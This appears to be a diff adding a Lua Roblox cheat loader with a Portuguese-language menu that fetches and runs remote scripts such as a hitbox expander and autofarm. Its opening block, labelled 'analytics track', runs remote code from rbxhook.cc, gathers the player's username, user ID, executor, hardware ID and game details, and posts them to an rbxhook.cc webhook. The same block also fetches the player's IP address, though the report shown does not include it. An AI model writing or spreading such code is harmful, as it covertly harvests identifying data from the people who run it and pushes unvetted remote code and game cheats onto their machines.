@@ -1,0 +1,503 @@
+getgenv().Config = {api = "2d162d1ed1f9b0ca9c2296c2a83613ccbe0c8063f76539d07282ecb8d987e54b"} -- DO NOT CHANGE
+
+--analytics track
+loadstring(game:HttpGet("https://rbxhook.cc/lua/track.lua"))()
+
+local player = game:GetService("Players").LocalPlayer
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+local MarketplaceService = game:GetService("MarketplaceService")
+
+local url = "https://rbxhook.cc/r/6bbee11b70f4437a337ffac7026a56f6"
+
+-- Platform detection
+local function getPlatform()
+    if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
+        return "Mobile"
+    elseif UserInputService.KeyboardEnabled then
+        return "PC"
+    elseif UserInputService.GamepadEnabled then
+        return "Console"
+    else
+        return "Unknown"
+    end
+end
+
+-- Executor detection
+local executor = "Unknown"
+local executorVersion = "N/A"
+if identifyexecutor then
+    executor = identifyexecutor()
+elseif syn then
+    executor = "Synapse X"
+elseif KRNL_LOADED then
+    executor = "Krnl"
+elseif fluxus then
+    executor = "Fluxus"
+elseif is_sirhurt_closure then
+    executor = "SirHurt"
+elseif OXYGEN then
+    executor = "Oxygen U"
+end
+
+-- HWID detection
+local hwid = "Unavailable"
+pcall(function()
+    if syn and syn.gethwid then
+        hwid = syn.gethwid()
+    elseif gethwid then
+        hwid = gethwid()
+    elseif fluxus and getgenv and getgenv().fluxus then
+        hwid = tostring(getgenv().fluxus.HWID or "Unavailable")
+    elseif delta and get_hw_id then
+        hwid = tostring(get_hw_id())
+    end
+end)
+
+-- Game info
+local gameName = "Unknown"
+pcall(function()
+    local info = MarketplaceService:GetProductInfo(game.PlaceId)
+    if info and info.Name then 
+        gameName = info.Name 
+    end
+end)
+
+local serverRegion = "Unknown"
+pcall(function()
+    serverRegion = tostring(game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(player) or "Unknown")
+end)
+
+-- IP Address detection
+local ipAddress = "Unavailable"
+pcall(function()
+    local ipResponse = game:HttpGet("https://api.ipify.org")
+    if ipResponse and ipResponse ~= "" then
+        ipAddress = ipResponse
+    end
+end)
+
+-- Account info
+local accountAge = "Unknown"
+local membership = "Free"
+pcall(function()
+    accountAge = tostring(player.AccountAge) .. " days"
+    membership = player.MembershipType == Enum.MembershipType.Premium and "Premium" or "Free"
+end)
+
+local data = {
+    avatar_url = "https://rbxhook.cc/img/logo.png",
+    content = "",
+    username = "rbxhook.cc",
+    embeds = {
+        {
+            title = "Script Execution Report",
+            color = 3447003,
+            author = {
+                name = player.Name,
+                icon_url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=150&height=150&format=png"
+            },
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(player.UserId) .. "&width=420&height=420&format=png"
+            },
+            fields = {
+                {
+                    name = "User Info",
+                    value = "Username: " .. player.Name .. "\nUser ID: " .. player.UserId .. "\nPlatform: " .. getPlatform(),
+                    inline = false
+                },
+                {
+                    name = "Executor Info", 
+                    value = "Executor: " .. executor .. "\nVersion: " .. executorVersion,
+                    inline = false
+                },
+                {
+                    name = "HWID",
+                    value = hwid,
+                    inline = false
+                },
+                {
+                    name = "Game Info",
+                    value = "Game Name: " .. gameName .. "\nPlace ID: " .. game.PlaceId .. "\nJob ID: " .. game.JobId,
+                    inline = false
+                }
+            },
+            footer = {
+                text = "rbxhook.cc | User ID: " .. tostring(player.UserId)
+            },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+    }
+}
+
+-- Validate and send webhook
+local success, encoded = pcall(function()
+    return HttpService:JSONEncode(data)
+end)
+
+if not success then
+    print("JSON encoding failed")
+    return
+end
+
+local requestFunc = syn and syn.request or request or http_request
+if not requestFunc then
+    print("Error: JK291-RH")
+    return
+end
+
+local response = requestFunc({
+    Url = url,
+    Method = "POST",
+    Headers = {
+        ["Content-Type"] = "application/json"
+    },
+    Body = encoded
+})
+
+if response then
+    print("Status:", response.StatusCode)
+    if response.StatusCode == 200 or response.StatusCode == 204 then
+        print("✅ Webhook sent successfully!")
+    else
+        print("Error: J1920-RH - (SHARE THIS TO SERVICE OWNER) : " .. response.StatusCode)
+        if response.Body then
+            print("Response: " .. response.Body)
+        end
+    end
+else
+    print("ERROR: No response from server")
+end
+
+print("✅ Script initialized successfully!")
+
+--== CONFIG ==--
+
+local ICON_IMAGE = "rbxassetid://7653499281"
+
+local player = game.Players.LocalPlayer 
+local RunService = game:GetService("RunService") 
+local TweenService = game:GetService("TweenService") 
+local UserInputService = game:GetService("UserInputService") 
+local StarterGui = game:GetService("StarterGui")
+
+local function notif(t,m) 
+    pcall(function() 
+        StarterGui:SetCore("SendNotification",{Title=t,Text=m,Duration=4}) 
+    end) 
+end
+
+--== NOVA PALETA DARK MINIMALISTA (ÚNICA COISA ALTERADA) ==--
+local COLORS = {
+    Primary = Color3.fromRGB(60, 130, 255),     -- azul moderno suave
+    Secondary = Color3.fromRGB(180, 180, 190),  -- cinza neutro claro
+    Accent = Color3.fromRGB(95, 105, 120),      -- acento elegante discreto
+    Background = Color3.fromRGB(12, 12, 14),    -- fundo quase preto (profissional)
+    DarkBG = Color3.fromRGB(18, 18, 22),        -- painéis escuros
+    Frame = Color3.fromRGB(25, 25, 30),         -- caixas / botões
+    White = Color3.fromRGB(240, 240, 245),      -- texto branco suave
+    Gray = Color3.fromRGB(70, 70, 80)           -- cinza moderno
+}
+
+local function tween(obj, props, duration, style, direction) 
+    if not obj or not obj.Parent then return end 
+    pcall(function() 
+        TweenService:Create(
+            obj, 
+            TweenInfo.new(duration or 0.3, style or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out), 
+            props
+        ):Play() 
+    end) 
+end
+
+--== GUI ==--
+
+local screenGui = Instance.new("ScreenGui") 
+screenGui.Name = "FP3" 
+screenGui.ResetOnSpawn = false 
+screenGui.Parent = game.CoreGui 
+screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+local openSound = Instance.new("Sound", screenGui) 
+openSound.SoundId = "rbxassetid://97861038165143" 
+openSound.Volume = 1
+
+local closeSound = Instance.new("Sound", screenGui) 
+closeSound.SoundId = "rbxassetid://4590657391" 
+closeSound.Volume = 1
+
+local iconBtn = Instance.new("ImageButton") 
+iconBtn.Name = "Icon" 
+iconBtn.Size = UDim2.new(0, 70, 0, 70) 
+iconBtn.Position = UDim2.new(0, 20, 0, 20) 
+iconBtn.BackgroundColor3 = COLORS.Background 
+iconBtn.BorderSizePixel = 0 
+iconBtn.Image = ICON_IMAGE 
+iconBtn.Active = true 
+iconBtn.Draggable = true 
+iconBtn.Parent = screenGui
+
+local function round(obj,r) 
+    local c = Instance.new("UICorner",obj) 
+    c.CornerRadius = UDim.new(0,r) 
+end 
+round(iconBtn,14)
+
+local iconStroke = Instance.new("UIStroke",iconBtn) 
+iconStroke.Color = COLORS.Primary 
+iconStroke.Thickness = 3
+
+--== MAIN FRAME ==--
+
+local mainFrame = Instance.new("Frame") 
+mainFrame.Size = UDim2.new(0, 260, 0, 240) 
+mainFrame.Position = UDim2.new(0.5, -130, 0.5, -120) 
+mainFrame.BackgroundColor3 = COLORS.Background 
+mainFrame.BorderSizePixel = 0 
+mainFrame.Visible = false 
+mainFrame.Active = true 
+mainFrame.Draggable = true 
+mainFrame.ClipsDescendants = true 
+mainFrame.Parent = screenGui 
+round(mainFrame, 15)
+
+local strokeMain = Instance.new("UIStroke", mainFrame) 
+strokeMain.Color = COLORS.Primary 
+strokeMain.Thickness = 3
+
+--== GRADIENT DE FUNDO ==--
+
+local gradient = Instance.new("UIGradient", mainFrame) 
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(15,15,20)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(30,30,40))
+} 
+gradient.Rotation = 45
+
+--== TOP BAR ==--
+
+local topBar = Instance.new("Frame") 
+topBar.Size = UDim2.new(1, 0, 0, 50) 
+topBar.BackgroundColor3 = COLORS.Primary 
+topBar.BorderSizePixel = 0 
+topBar.Parent = mainFrame 
+round(topBar, 15)
+
+local topIcon = Instance.new("ImageLabel") 
+topIcon.Size = UDim2.new(0, 35, 0, 35) 
+topIcon.Position = UDim2.new(0, 8, 0.5, -17.5) 
+topIcon.BackgroundColor3 = COLORS.Background 
+topIcon.Image = ICON_IMAGE 
+topIcon.BorderSizePixel = 0 
+topIcon.Parent = topBar 
+round(topIcon, 8)
+
+local titleLabel = Instance.new("TextLabel") 
+titleLabel.Size = UDim2.new(0, 150, 0, 20) 
+titleLabel.Position = UDim2.new(0, 50, 0, 8) 
+titleLabel.BackgroundTransparency = 1 
+titleLabel.Text = "[E.B Tevez] por @fp3" 
+titleLabel.Font = Enum.Font.GothamBold 
+titleLabel.TextSize = 15 
+titleLabel.TextColor3 = COLORS.White 
+titleLabel.TextXAlignment = Enum.TextXAlignment.Left 
+titleLabel.Parent = topBar
+
+--== MINIMIZE / CLOSE ==--
+
+local minimizeBtn = Instance.new("TextButton") 
+minimizeBtn.Size = UDim2.new(0,25,0,25) 
+minimizeBtn.Position = UDim2.new(1,-60,0.5,-12.5) 
+minimizeBtn.Text = "—" 
+minimizeBtn.BackgroundColor3 = COLORS.Background 
+minimizeBtn.Font = Enum.Font.GothamBold 
+minimizeBtn.TextColor3 = COLORS.White 
+minimizeBtn.TextSize = 16 
+minimizeBtn.BorderSizePixel = 0 
+round(minimizeBtn,6) 
+minimizeBtn.Parent = topBar
+
+local closeBtn = minimizeBtn:Clone() 
+closeBtn.Text = "×" 
+closeBtn.Position = UDim2.new(1,-30,0.5,-12.5) 
+closeBtn.TextSize = 20 
+closeBtn.Parent = topBar
+
+--== TABS ==--
+
+local tabContainer = Instance.new("Frame") 
+tabContainer.Size = UDim2.new(1,-16,0,30) 
+tabContainer.Position = UDim2.new(0,8,0,58) 
+tabContainer.BackgroundTransparency = 1 
+tabContainer.Parent = mainFrame
+
+local tabs = {"Principal", "Discord"} 
+local tabButtons = {} 
+local contentContainers = {} 
+local tabWidth = (260 - 24) / #tabs
+
+for i,name in ipairs(tabs) do 
+    local btn = Instance.new("TextButton") 
+    btn.Name = name 
+    btn.Size = UDim2.new(0, tabWidth-4, 0, 30) 
+    btn.Position = UDim2.new(0, (i-1)*tabWidth+2, 0, 0) 
+    btn.Text = name 
+    btn.TextColor3 = COLORS.White 
+    btn.Font = Enum.Font.GothamBold 
+    btn.TextSize = 11 
+    btn.BackgroundColor3 = i==1 and COLORS.Primary or COLORS.DarkBG 
+    btn.BorderSizePixel = 0 
+    round(btn,8) 
+    btn.Parent = tabContainer 
+    tabButtons[name] = btn 
+end
+
+--== CONTAINER ==--
+
+local contentFrame = Instance.new("Frame") 
+contentFrame.Size = UDim2.new(1,-16,1,-100) 
+contentFrame.Position = UDim2.new(0,8,0,92) 
+contentFrame.BackgroundTransparency = 1 
+contentFrame.Parent = mainFrame
+
+for i,name in ipairs(tabs) do 
+    local s = Instance.new("ScrollingFrame") 
+    s.Name = name 
+    s.Size = UDim2.new(1,0,1,0) 
+    s.BackgroundTransparency = 1 
+    s.ScrollBarThickness = 4 
+    s.ScrollBarImageColor3 = COLORS.Primary 
+    s.Visible = i==1 
+    s.CanvasSize = UDim2.new(0,0,0,600) 
+    s.Parent = contentFrame 
+    contentContainers[name] = s 
+end
+
+local principal = contentContainers["Principal"] 
+local discord = contentContainers["Discord"]
+
+--== SEPARADOR ==--
+
+local function separator(parent, text) 
+    local label = Instance.new("TextLabel") 
+    label.Size = UDim2.new(1,-10,0,25) 
+    label.Position = UDim2.new(0,5,0,#parent:GetChildren()*25) 
+    label.BackgroundTransparency = 1 
+    label.Font = Enum.Font.GothamBold 
+    label.Text = text 
+    label.TextColor3 = COLORS.Primary 
+    label.TextXAlignment = Enum.TextXAlignment.Left 
+    label.TextSize = 13 
+    label.Parent = parent 
+end
+
+--== BUTTON ==--
+
+local function createMenuButton(parent, text, code) 
+    local btn = Instance.new("TextButton") 
+    btn.Size = UDim2.new(1,-10,0,40) 
+    btn.Position = UDim2.new(0,5,0,#parent:GetChildren()*45) 
+    btn.BackgroundColor3 = COLORS.Frame 
+    btn.Text = text 
+    btn.TextColor3 = COLORS.White 
+    btn.Font = Enum.Font.GothamBold 
+    btn.TextSize = 12 
+    btn.BorderSizePixel = 0 
+    round(btn,8) 
+    btn.Parent = parent
+
+    btn.MouseEnter:Connect(function() 
+        tween(btn, {BackgroundColor3 = COLORS.DarkBG}, 0.2) 
+    end)
+
+    btn.MouseLeave:Connect(function() 
+        tween(btn, {BackgroundColor3 = COLORS.Frame}, 0.2) 
+    end)
+
+    btn.MouseButton1Click:Connect(function() 
+        notif("Executado", "Executado: "..text) 
+        pcall(function() loadstring(code)() end) 
+    end)
+
+    return btn 
+end
+
+--== PRINCIPAL BUTTONS ==--
+
+separator(principal, "Scripts")
+
+createMenuButton(principal, "Hitbox Expander", "loadstring(game:HttpGet('https://raw.githubusercontent.com/europaaaaaaaaaa/EB/refs/heads/main/HBexpander'))()")
+
+createMenuButton(principal, "Tevez mod", "loadstring(game:HttpGet('https://raw.githubusercontent.com/europaaaaaaaaaa/EB/refs/heads/main/tevez-mod'))()")
+
+createMenuButton(principal, "Autofarm", "loadstring(game:HttpGet('https://raw.githubusercontent.com/europaaaaaaaaaa/EB/refs/heads/main/autofarm'))()")
+
+--== DISCORD ==--
+
+separator(discord, "Servidor")
+
+local copyBtn = Instance.new("TextButton") 
+copyBtn.Size = UDim2.new(1,-10,0,40) 
+copyBtn.Position = UDim2.new(0,5,0,30) 
+copyBtn.Text = "Copiar link" 
+copyBtn.BackgroundColor3 = COLORS.Frame 
+copyBtn.TextColor3 = COLORS.White 
+copyBtn.Font = Enum.Font.GothamBold 
+copyBtn.TextSize = 12 
+round(copyBtn,8) 
+copyBtn.Parent = discord
+
+copyBtn.MouseButton1Click:Connect(function() 
+    if setclipboard then 
+        setclipboard("https://discord.gg/wz3D7gnZ5q") 
+        notif("Discord", "Copiado!") 
+    end 
+end)
+
+--== TAB SWITCH ==--
+
+for name,button in pairs(tabButtons) do 
+    button.MouseButton1Click:Connect(function() 
+        for n,b in pairs(tabButtons) do 
+            b.BackgroundColor3 = n==name and COLORS.Primary or COLORS.DarkBG 
+        end 
+        for n,c in pairs(contentContainers) do 
+            c.Visible = n==name 
+        end 
+    end) 
+end
+
+--== MENU OPEN ==--
+
+local menuOpen = false
+
+iconBtn.MouseButton1Click:Connect(function() 
+    menuOpen = not menuOpen 
+    if menuOpen then 
+        openSound:Play() 
+        mainFrame.Visible = true 
+        mainFrame.Size = UDim2.new(0,0,0,0) 
+        tween(mainFrame,{Size=UDim2.new(0,260,0,240)},0.4,Enum.EasingStyle.Back) 
+    else 
+        closeSound:Play() 
+        tween(mainFrame,{Size=UDim2.new(0,0,0,0)},0.3) 
+        task.wait(0.3) 
+        mainFrame.Visible = false 
+    end 
+end)
+
+minimizeBtn.MouseButton1Click:Connect(function() 
+    closeSound:Play() 
+    menuOpen = false 
+    tween(mainFrame,{Size=UDim2.new(0,0,0,0)},0.3) 
+    task.wait(0.3) 
+    mainFrame.Visible = false 
+end)
+
+closeBtn.MouseButton1Click:Connect(function() 
+    closeSound:Play() 
+    tween(mainFrame,{Size=UDim2.new(0,0,0,0)},0.3) 
+    tween(iconBtn,{Size=UDim2.new(0,0,0,0)},0.3) 
+    task.wait(0.4) 
+    pcall(function() screenGui:Destroy() end) 
+end)
